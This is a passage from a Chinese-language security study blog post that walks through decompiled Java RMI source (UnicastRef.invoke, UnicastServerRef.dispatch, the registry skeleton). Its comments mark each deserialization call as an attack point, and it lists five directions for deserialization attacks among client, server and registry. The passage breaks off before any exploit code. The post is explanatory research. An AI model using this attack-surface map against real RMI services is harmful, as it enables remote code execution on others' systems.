class-name">MarshalException</span><span class="token punctuation">(</span><span class="token string">"error marshalling return"</span><span class="token punctuation">,</span> var72<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>如此这般，这般如此，rmiregistry这块处理客户端的查询信息的部分就简单分析完了。</p><p>然后回到客户端这里</p><pre class=" language-java"><code class="language-java">    <span class="token comment" spellcheck="true">//返回一个实现了IHello接口的Proxy对象</span>    IHello hello <span class="token operator">=</span> <span class="token punctuation">(</span>IHello<span class="token punctuation">)</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">getRegistry</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> <span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//表面上时执行sayHello方法，实际上执行的是Proxy对象的Invoke方法</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>hello<span class="token punctuation">.</span><span class="token function">sayHello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>贴一下调用链</p><p>![image-20200722213007383](个人学习过程中对RMI JRMP 以及JNDI的一些理解/10.png)可以看到核心内容都在UnicastRef的Invoke方法,    下面是该方法的部分代码</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//var1 为当前的Proxy对象，</span><span class="token keyword">public</span> Object <span class="token function">invoke</span><span class="token punctuation">(</span>Remote var1<span class="token punctuation">,</span> Method var2<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> var3<span class="token punctuation">,</span> <span class="token keyword">long</span> var4<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment" spellcheck="true">//创建一个链接对象</span>    Connection var6 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>ref<span class="token punctuation">.</span><span class="token function">getChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    StreamRemoteCall var7 <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">boolean</span> var8 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> var9 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    Object var13<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>              <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token comment" spellcheck="true">//和getRegistry()与creatRegistry()一样 ，第三个参数为-1，但是这次调用的并不是                                                        RegistryImpl_Skel.bind方法        </span>        var7 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StreamRemoteCall</span><span class="token punctuation">(</span>var6<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>ref<span class="token punctuation">.</span><span class="token function">getObjID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object var11<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">//获取输出流</span>            ObjectOutput var10 <span class="token operator">=</span> var7<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//虽然没看里面的具体实现但是猜也能猜得到里面在序列化了一些东西</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">marshalCustomCallData</span><span class="token punctuation">(</span>var10<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//获取要传递的参数类型，可是这次我们没传参数所以就没有</span>            var11 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//如果传递的有参数的话会执行下面这个for循环，把参数相关的信息也序列化到里面</span>              <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> var12 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> var12 <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>var11<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>var12<span class="token punctuation">)</span> <span class="token punctuation">{</span>                          <span class="token comment" spellcheck="true">//由于该方法会将调用的远程方法的参数进行反序列化，由此此处也可以进行利用，可以称为客户端对服务端进行反序列化攻击的点</span>              <span class="token comment" spellcheck="true">//也就是说，在这个远程调用的过程中，我们可以想办法，把参数的序列化数据替换成恶意序列化数据，我们就能攻击服务端，而服务端，也能替换其返回的序列化数据为恶意序列化数据，进而被动攻击客户端。</span>                    <span class="token function">marshalValue</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Class<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>var11<span class="token punctuation">)</span><span class="token punctuation">[</span>var12<span class="token punctuation">]</span><span class="token punctuation">,</span> var3<span class="token punctuation">[</span>var12<span class="token punctuation">]</span><span class="token punctuation">,</span> var10<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span>                <span class="token comment" spellcheck="true">//像服务端发送序列化的数据</span>        var7<span class="token punctuation">.</span><span class="token function">executeCall</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">//获取该远程方法的返回值类型</span>            Class <span class="token class-name">var46</span> <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                   <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            <span class="token comment" spellcheck="true">//获取输入流  </span>            var11 <span class="token operator">=</span> var7<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//解封装参数将返回值赋值给var46,也就是把返回的结果字符串“hello”赋值给var47</span>              <span class="token comment" spellcheck="true">//既然将返回的参数还原了，那么其中必定包含了反序列化，由此此处可以是服务端对客户端进行反序列化攻击的                            点</span>          <span class="token comment" spellcheck="true">//也就是说，在这个远程调用的过程中，我们可以想办法，把参数的序列化数据替换成恶意序列化数据，我们就能攻击服务端，而服务端，也能替换其返回的序列化数据为恶意序列化数据，进而被动攻击客户端。</span>            Object var47 <span class="token operator">=</span> <span class="token function">unmarshalValue</span><span class="token punctuation">(</span>var46<span class="token punctuation">,</span> <span class="token punctuation">(</span>ObjectInput<span class="token punctuation">)</span>var11<span class="token punctuation">)</span><span class="token punctuation">;</span>            var9 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            clientRefLog<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Log<span class="token punctuation">.</span>BRIEF<span class="token punctuation">,</span> <span class="token string">"free connection (reuse = true)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//释放链接通道</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>ref<span class="token punctuation">.</span><span class="token function">getChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">free</span><span class="token punctuation">(</span>var6<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            var13 <span class="token operator">=</span> var47<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> <span class="token operator">|</span> IOException var40<span class="token punctuation">)</span> <span class="token punctuation">{</span>                        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                var7<span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var38<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RuntimeException</span> var42<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">//最终返回var46的值</span>    <span class="token keyword">return</span> var13<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ok客户端这边的处理过程到此就已经完毕了,接下来跟到服务端看一看。</p><p>![image-20200723101759195](个人学习过程中对RMI JRMP 以及JNDI的一些理解/11.png)</p><p>根据调用链信息，先来看UnicastServerRef.dispatch()方法</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//Var1为实现了Remote接口的HelloImpl对象，Var2为客户端传来的StreamRemoteCall对象该对象里有ConnectionInputStream，也就是说远程调用的参数都在这里面存着</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">dispatch</span><span class="token punctuation">(</span>Remote var1<span class="token punctuation">,</span> RemoteCall var2<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> var3<span class="token punctuation">;</span>        ObjectInput var41<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">//获取输入流</span>            var41 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//读出来-1</span>            var3 <span class="token operator">=</span> var41<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var38<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnmarshalException</span><span class="token punctuation">(</span><span class="token string">"error unmarshalling call header"</span><span class="token punctuation">,</span> var38<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>skel <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">oldDispatch</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var3<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var3 <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnmarshalException</span><span class="token punctuation">(</span><span class="token string">"skeleton class not found but required for client version"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">long</span> var4<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            var4 <span class="token operator">=</span> var41<span class="token punctuation">.</span><span class="token function">readLong</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var37<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnmarshalException</span><span class="token punctuation">(</span><span class="token string">"error unmarshalling call header"</span><span class="token punctuation">,</span> var37<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        MarshalInputStream var7 <span class="token operator">=</span> <span class="token punctuation">(</span>MarshalInputStream<span class="token punctuation">)</span>var41<span class="token punctuation">;</span>        var7<span class="token punctuation">.</span><span class="token function">skipDefaultResolveClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Method var42 <span class="token operator">=</span> <span class="token punctuation">(</span>Method<span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>hashToMethod_Map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var42 <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnmarshalException</span><span class="token punctuation">(</span><span class="token string">"unrecognized method hash: method not supported by remote object"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">logCall</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var42<span class="token punctuation">)</span><span class="token punctuation">;</span>        Object<span class="token punctuation">[</span><span class="token punctuation">]</span> var9 <span class="token operator">=</span> null<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">unmarshalCustomCallData</span><span class="token punctuation">(</span>var41<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//从 ConnectionInputStream里反序列化出远程调用的参数</span>              <span class="token comment" spellcheck="true">//这里就是客户端可以用来攻击服务端的点，因为这里对远程调用方法的参数进行了反序列化，由此我们可以传递                             恶意的反序列化数据进来</span>            var9 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">unmarshalParameters</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var42<span class="token punctuation">,</span> var7<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">AccessException</span> var34<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token punctuation">(</span><span class="token punctuation">(</span>StreamRemoteCall<span class="token punctuation">)</span>var2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">discardPendingRefs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> var34<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> <span class="token operator">|</span> IOException var35<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token punctuation">(</span><span class="token punctuation">(</span>StreamRemoteCall<span class="token punctuation">)</span>var2<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">discardPendingRefs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnmarshalException</span><span class="token punctuation">(</span><span class="token string">"error unmarshalling arguments"</span><span class="token punctuation">,</span> var35<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>            var2<span class="token punctuation">.</span><span class="token function">releaseInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        Object var10<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">//反射调用对应的远程方法</span>            var10 <span class="token operator">=</span> var42<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var9<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvocationTargetException</span> var33<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> var33<span class="token punctuation">.</span><span class="token function">getTargetException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>              <span class="token comment" spellcheck="true">//获取输出流</span>            ObjectOutput var11 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getResultStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">//获取返回值类型</span>            Class <span class="token class-name">var12</span> <span class="token operator">=</span> var42<span class="token punctuation">.</span><span class="token function">getReturnType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var12 <span class="token operator">!=</span> Void<span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span> <span class="token punctuation">{</span>                  <span class="token comment" spellcheck="true">//序列化返回值等信息，同样也可以序列化一些恶意类信息</span>                <span class="token function">marshalValue</span><span class="token punctuation">(</span>var12<span class="token punctuation">,</span> var10<span class="token punctuation">,</span> var11<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var32<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">MarshalException</span><span class="token punctuation">(</span><span class="token string">"error marshalling return"</span><span class="token punctuation">,</span> var32<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var39<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Object var6 <span class="token operator">=</span> var39<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">logCallException</span><span class="token punctuation">(</span>var39<span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutput var8 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getResultStream</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var39 <span class="token keyword">instanceof</span> <span class="token class-name">Error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            var6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerError</span><span class="token punctuation">(</span><span class="token string">"Error occurred in server thread"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>Error<span class="token punctuation">)</span>var39<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var39 <span class="token keyword">instanceof</span> <span class="token class-name">RemoteException</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            var6 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ServerException</span><span class="token punctuation">(</span><span class="token string">"RemoteException occurred in server thread"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>Exception<span class="token punctuation">)</span>var39<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>suppressStackTraces<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">clearStackTraces</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Throwable<span class="token punctuation">)</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        var8<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>var39 <span class="token keyword">instanceof</span> <span class="token class-name">AccessException</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IOException</span><span class="token punctuation">(</span><span class="token string">"Connection is not reusable"</span><span class="token punctuation">,</span> var39<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>        var2<span class="token punctuation">.</span><span class="token function">releaseInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        var2<span class="token punctuation">.</span><span class="token function">releaseOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>好了服务端这边也简单的分析完了，我们来总结一下，在这些过程中可以利用的反序列化点。</p><p>首先是服务端调用bind方法像rmiregistry注册远程方法的信息时，在执行的过程中，调用了RegistryImpl_Skel.dispatch方法，反序列化服务端传来的数据，此为一个利用点，我们可以修改传递的数据从而达到从服务端对rmiregistry进行反序列化攻击</p><pre class=" language-java"><code class="language-java">        var9 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">//反序列化“hello”字符串</span>        var7 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>var9<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//这个位置本来是属于反序列化出来的“HelloImpl”对象的，但是最终结果得到的是一个Proxy对像</span>          <span class="token comment" spellcheck="true">//这个很关键，这个Proxy对象即所为的Stub(存根)，客户端就是通过这个Stub来知道服务端的地址和端口号从                               而进行通信的。</span>          <span class="token comment" spellcheck="true">//这里的反序列化点很明显是我们可以利用的，通过RMI服务端执行bind，我们就可以攻击rmiregistry注                 册中心，导致其反序列化RCE</span>        var80 <span class="token operator">=</span> <span class="token punctuation">(</span>Remote<span class="token punctuation">)</span>var9<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>接下来就是客户端调用lookup方法向rmiregistry进行远程方法信息查询时, rmiregistry反序列化了客户端传来的数据，这样以来我们就在客户端像rmiregistry查询时来构造恶意的反序列化数据。</p><pre class=" language-java"><code class="language-java">    <span class="token comment" spellcheck="true">//获取客户端传来的输入流</span>    var8 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">//反序列化字符串“hello”</span>      <span class="token comment" spellcheck="true">//同样在反序列化客户端传来的查询数据时，这个点我们也可以利用lookup方法，理论上，我们可以在客                            户端用它去主动攻击RMI Registry，也能通过RMI Registry去被动攻击客户端</span>      <span class="token comment" spellcheck="true">//尽管lookup时客户端似乎只能传递String类型，但是还是那句话，只要后台不做限制，客户端的东西皆可控</span>    var7 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>var8<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>然后就是客户端处理rmiregistry返回的数据时，我们已知正常情况下rmiregistry回返回一个实现了Remote的Proxy对象，但是我们也可以利用rmiregistry返回一些恶意的反序列化对象给客户端，从而进行反序列化攻击。</p><pre class=" language-java"><code class="language-java">          <span class="token comment" spellcheck="true">//获取rmiregistry返回的输入流</span>        ObjectInput var4 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//反序列化返回的Stub</span>          <span class="token comment" spellcheck="true">//同样在反序列化rmiregistry返回的Stub时这个点我们也可以利用lookup方法，理论上，我们可以在客                            户端用它去主动攻击RMI Registry，也能通过RMI Registry去被动攻击客户端</span>        var22 <span class="token operator">=</span> <span class="token punctuation">(</span>Remote<span class="token punctuation">)</span>var4<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>接下来就该客户端和服务端之间的通信了，同理客户端通过rmiregistry返回的那个Proxy对象，也就是所谓的Stub和服务端进行通信，首先服务端接受到数据以后，会对客户端传来的所需要远程方法处理的参数进行反序列化，这里又是一个可以利用的点，因为我们从客户端的角度，这个只要后台不做检验，我们就可控</p><pre class=" language-java"><code class="language-java">        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">unmarshalCustomCallData</span><span class="token punctuation">(</span>var41<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//从 ConnectionInputStream里反序列化出远程调用的参数</span>          <span class="token comment" spellcheck="true">//这里就是客户端可以用来攻击服务端的点，因为这里对远程调用方法的参数进行了反序列化，由此我们可以传递                             恶意的反序列化数据进来</span>        var9 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">unmarshalParameters</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var42<span class="token punctuation">,</span> var7<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>最后就是服务端处理完成后，将结果返回给客户端，同理，这个范围值从服务端的角度来说，也是可控的，甲乙双方可以进行互相攻击。</p><pre class=" language-java"><code class="language-java">        <span class="token comment" spellcheck="true">//获取输入流  </span>        var11 <span class="token operator">=</span> var7<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//解封装参数将返回值赋值给var46,也就是把返回的结果字符串“hello”赋值给var47</span>          <span class="token comment" spellcheck="true">//既然将返回的参数还原了，那么其中必定包含了反序列化，由此此处可以是服务端对客户端进行反序列化攻击的                            点</span>      <span class="token comment" spellcheck="true">//也就是说，在这个远程调用的过程中，我们可以想办法，把参数的序列化数据替换成恶意序列化数据，我们就能攻击服务端，而服务端，也能替换其返回的序列化数据为恶意序列化数据，进而被动攻击客户端。</span>        Object var47 <span class="token operator">=</span> <span class="token function">unmarshalValue</span><span class="token punctuation">(</span>var46<span class="token punctuation">,</span> <span class="token punctuation">(</span>ObjectInput<span class="token punctuation">)</span>var11<span class="token punctuation">)</span><span class="token punctuation">;</span>        var9 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        clientRefLog<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Log<span class="token punctuation">.</span>BRIEF<span class="token punctuation">,</span> <span class="token string">"free connection (reuse = true)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//释放链接通道</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>ref<span class="token punctuation">.</span><span class="token function">getChannel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">free</span><span class="token punctuation">(</span>var6<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        var13 <span class="token operator">=</span> var47<span class="token punctuation">;</span></code></pre><p>所以总结一下有五条攻击思路</p><p>服务端——-&gt;rmiregistry</p><p>客户端——-&gt;rmiregistry</p><p>rmiregistry——-&gt;客户端</p><p>客户端——-&gt;服务端</p><p>服务端——-&gt;客户端</p><h2 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="headerlink" title="客户端攻击服务端"></a>客户端攻击服务端</h2><p>接下来就一个一个来试验一下，这几条攻击思路。</p><p>首先客户端(远程方法调用方)，对服务端(远程方法服务方)进行反序列化攻击，客户端对服务端进行反序列化的攻击关键在于传递的参数</p><p>那我们应该怎么来实现呢？我们来重新写一个远程方法的调用,(此处参考了知道创宇大佬的文章和代码<a 